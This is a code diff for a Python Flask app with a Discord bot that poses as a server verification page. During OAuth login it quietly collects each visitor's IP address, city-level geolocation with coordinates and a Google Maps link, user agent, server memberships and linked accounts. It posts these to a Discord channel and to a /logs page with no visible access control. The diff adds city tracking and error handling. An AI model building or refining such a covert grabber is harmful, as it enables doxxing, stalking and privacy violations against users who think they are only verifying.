@@ -19,56 +19,71 @@ DISCORD_BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN")
 
 # --- IP取得 ---
 def get_client_ip():
-    if "X-Forwarded-For" in request.headers:
-        return request.headers["X-Forwarded-For"].split(",")[0].strip()
-    return request.remote_addr
+    try:
+        if "X-Forwarded-For" in request.headers:
+            ip = request.headers["X-Forwarded-For"].split(",")[0].strip()
+            if ip:
+                return ip
+        return request.remote_addr or "0.0.0.0"
+    except:
+        return "0.0.0.0"
 
 
 # --- IPから地域情報 ---
 def get_geo_info(ip):
     try:
+        # ローカルIPやプライベートIPの場合はグローバルIPに置換
+        if ip.startswith(("127.", "192.", "10.", "172.")):
+            ip = requests.get("https://api.ipify.org").text
         response = requests.get(
-            f"http://ip-api.com/json/{ip}?lang=ja&fields=status,message,country,regionName,lat,lon,proxy,hosting,query"
+            f"http://ip-api.com/json/{ip}?lang=ja&fields=status,message,country,regionName,city,lat,lon,proxy,hosting,query"
         )
         data = response.json()
+        if data.get("status") != "success":
+            raise ValueError("Geo取得失敗")
         return {
+            "ip": data.get("query", ip),
             "country": data.get("country", "不明"),
             "region": data.get("regionName", "不明"),
+            "city": data.get("city", "不明"),
             "lat": data.get("lat"),
             "lon": data.get("lon"),
             "proxy": data.get("proxy", False),
             "hosting": data.get("hosting", False),
-            "ip": data.get("query"),
         }
     except:
         return {
+            "ip": ip,
             "country": "不明",
             "region": "不明",
+            "city": "不明",
             "lat": None,
             "lon": None,
             "proxy": False,
             "hosting": False,
-            "ip": ip,
         }
 
 
 # --- ログ保存 ---
 def save_log(discord_id, data):
-    logs = {}
-    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    try:
+        logs = {}
+        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-    if os.path.exists(ACCESS_LOG_FILE):
-        with open(ACCESS_LOG_FILE, "r", encoding="utf-8") as f:
-            logs = json.load(f)
+        if os.path.exists(ACCESS_LOG_FILE):
+            with open(ACCESS_LOG_FILE, "r", encoding="utf-8") as f:
+                logs = json.load(f)
 
-    if discord_id not in logs:
-        logs[discord_id] = {"history": []}
+        if discord_id not in logs:
+            logs[discord_id] = {"history": []}
 
-    data["timestamp"] = now
-    logs[discord_id]["history"].append(data)
+        data["timestamp"] = now
+        logs[discord_id]["history"].append(data)
 
-    with open(ACCESS_LOG_FILE, "w", encoding="utf-8") as f:
-        json.dump(logs, f, indent=4, ensure_ascii=False)
+        with open(ACCESS_LOG_FILE, "w", encoding="utf-8") as f:
+            json.dump(logs, f, indent=4, ensure_ascii=False)
+    except Exception as e:
+        print("ログ保存エラー:", e)
 
 
 # --- 認証ページ ---
@@ -90,55 +105,71 @@ def callback():
     if not code:
         return "コードがありません", 400
 
-    token = requests.post(
-        "https://discord.com/api/oauth2/token",
-        data={
-            "client_id": DISCORD_CLIENT_ID,
-            "client_secret": DISCORD_CLIENT_SECRET,
-            "grant_type": "authorization_code",
-            "code": code,
-            "redirect_uri": REDIRECT_URI,
-            "scope": "identify email guilds connections",
-        },
-        headers={"Content-Type": "application/x-www-form-urlencoded"},
-    ).json()
-
-    access_token = token.get("access_token")
-    if not access_token:
-        return "アクセストークン取得失敗", 400
+    try:
+        token_resp = requests.post(
+            "https://discord.com/api/oauth2/token",
+            data={
+                "client_id": DISCORD_CLIENT_ID,
+                "client_secret": DISCORD_CLIENT_SECRET,
+                "grant_type": "authorization_code",
+                "code": code,
+                "redirect_uri": REDIRECT_URI,
+                "scope": "identify email guilds connections",
+            },
+            headers={"Content-Type": "application/x-www-form-urlencoded"},
+        )
+        token = token_resp.json()
+        access_token = token.get("access_token")
+        if not access_token:
+            return "アクセストークン取得失敗", 400
+    except Exception as e:
+        return f"トークン取得エラー: {e}", 500
 
     # ユーザー情報
-    user = requests.get(
-        "https://discord.com/api/users/@me",
-        headers={"Authorization": f"Bearer {access_token}"},
-    ).json()
+    try:
+        user_resp = requests.get(
+            "https://discord.com/api/users/@me",
+            headers={"Authorization": f"Bearer {access_token}"},
+        )
+        user = user_resp.json()
+    except:
+        return "ユーザー情報取得失敗", 500
 
     # サーバー参加処理
-    requests.put(
-        f"https://discord.com/api/guilds/{DISCORD_GUILD_ID}/members/{user['id']}",
-        headers={
-            "Authorization": f"Bot {DISCORD_BOT_TOKEN}",
-            "Content-Type": "application/json",
-        },
-        json={"access_token": access_token},
-    )
+    try:
+        requests.put(
+            f"https://discord.com/api/guilds/{DISCORD_GUILD_ID}/members/{user['id']}",
+            headers={
+                "Authorization": f"Bot {DISCORD_BOT_TOKEN}",
+                "Content-Type": "application/json",
+            },
+            json={"access_token": access_token},
+        )
+    except Exception as e:
+        print("サーバー参加エラー:", e)
 
     # --- IP & GEO ---
     ip = get_client_ip()
-    if ip.startswith(("127.", "192.", "10.", "172.")):
-        ip = requests.get("https://api.ipify.org").text
     geo = get_geo_info(ip)
 
     # --- 追加情報 ---
     user_agent = request.headers.get("User-Agent", "不明")
-    guilds = requests.get(
-        "https://discord.com/api/users/@me/guilds",
-        headers={"Authorization": f"Bearer {access_token}"},
-    ).json()
-    connections = requests.get(
-        "https://discord.com/api/users/@me/connections",
-        headers={"Authorization": f"Bearer {access_token}"},
-    ).json()
+
+    try:
+        guilds = requests.get(
+            "https://discord.com/api/users/@me/guilds",
+            headers={"Authorization": f"Bearer {access_token}"},
+        ).json()
+    except:
+        guilds = []
+
+    try:
+        connections = requests.get(
+            "https://discord.com/api/users/@me/connections",
+            headers={"Authorization": f"Bearer {access_token}"},
+        ).json()
+    except:
+        connections = []
 
     data = {
         "username": user.get("username", ""),
@@ -155,6 +186,7 @@ def callback():
         "ip": geo["ip"],
         "country": geo["country"],
         "region": geo["region"],
+        "city": geo["city"],
         "lat": geo["lat"],
         "lon": geo["lon"],
         "map_url": f"https://www.google.com/maps?q={geo['lat']},{geo['lon']}"
@@ -177,7 +209,7 @@ def callback():
                 f"名前: {data['username']}#{data['discriminator']}\n"
                 f"ID: {data['id']}\n"
                 f"IP: {data['ip']}\n"
-                f"国: {data['country']} / 地域: {data['region']}\n"
+                f"国: {data['country']} / 地域: {data['region']} / 市: {data['city']}\n"
                 f"Google Map: {data['map_url']}\n"
                 f"Proxy: {data['proxy']} / Hosting: {data['hosting']}\n"
                 f"UA: {data['user_agent']}\n"
@@ -198,9 +230,8 @@ def callback():
             )
 
         bot.loop.create_task(bot.assign_role(user["id"]))
-
     except Exception as e:
-        print("Botが準備できていません:", e)
+        print("Botタスク作成エラー:", e)
 
     return f"{data['username']}#{data['discriminator']} さん、ようこそ！"
 
@@ -209,9 +240,12 @@ def callback():
 @app.route("/logs")
 def show_logs():
     logs = {}
-    if os.path.exists(ACCESS_LOG_FILE):
-        with open(ACCESS_LOG_FILE, "r", encoding="utf-8") as f:
-            logs = json.load(f)
+    try:
+        if os.path.exists(ACCESS_LOG_FILE):
+            with open(ACCESS_LOG_FILE, "r", encoding="utf-8") as f:
+                logs = json.load(f)
+    except Exception as e:
+        print("ログ読み込みエラー:", e)
     return render_template("logs.html", logs=logs)
 
 
@@ -222,4 +256,4 @@ def run_bot():
 
 if __name__ == "__main__":
     threading.Thread(target=run_bot, daemon=True).start()
-    app.run(host="0.0.0.0", port=10000)
+    app.run(host="0.0.0.0", port=10000, debug=False)
